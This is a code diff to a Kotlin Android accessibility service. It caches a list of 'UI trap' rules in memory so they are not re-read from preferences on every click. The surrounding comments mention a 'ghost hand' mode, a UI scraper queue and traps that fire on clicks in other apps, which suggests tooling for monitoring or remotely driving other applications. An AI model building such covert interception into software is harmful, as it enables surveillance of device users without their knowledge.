@@ -24,6 +24,17 @@ class MyAccessibilityService : AccessibilityService() {
 
     private var nextAllowedCheck = 0L
     private var cachedRules: JSONObject = JSONObject()
+    private var cachedUiTraps: JSONArray = JSONArray()
+
+    fun reloadUiTraps() {
+        try {
+            val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
+            val trapsStr = prefs.getString("ui_traps_array", "[]") ?: "[]"
+            cachedUiTraps = JSONArray(trapsStr)
+        } catch (e: Exception) {
+            cachedUiTraps = JSONArray()
+        }
+    }
     
     // GHOST HAND STATE
     private var isGhostActive = false
@@ -170,6 +181,7 @@ class MyAccessibilityService : AccessibilityService() {
         
         // Restore Scraper Session Queue
         loadTreeTasks()
+        reloadUiTraps()
         
         val rulesStr = prefs.getString("cached_rules", "{}")
         cachedRules = try {
@@ -480,9 +492,7 @@ class MyAccessibilityService : AccessibilityService() {
         }
 
         // --- UNIVERSAL UI TRAP (Tap-Only Engine - Multiple Traps Support) ---
-        val statsPrefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
-        val trapsStr = statsPrefs.getString("ui_traps_array", "[]") ?: "[]"
-        if (trapsStr != "[]") {
+        if (cachedUiTraps.length() > 0) {
             // STRICT REQUIREMENT: Only react to physical clicks
             if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                 val pkg = event.packageName?.toString() ?: ""
@@ -491,11 +501,10 @@ class MyAccessibilityService : AccessibilityService() {
                 val isEditable = event.className?.toString()?.contains("EditText", ignoreCase = true) == true
                 
                 if (!isEditable) {
-                    val trapsArr = try { org.json.JSONArray(trapsStr) } catch(e: Exception) { org.json.JSONArray() }
-                    
-                    // Iterate through all active traps
-                    for (i in 0 until trapsArr.length()) {
-                        val trap = trapsArr.getJSONObject(i)
+                    val statsPrefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
+                    // Iterate through all active traps directly from RAM
+                    for (i in 0 until cachedUiTraps.length()) {
+                        val trap = cachedUiTraps.getJSONObject(i)
                         val targetData = trap.optString("target", "")
                         
                         if (targetData.isEmpty()) continue
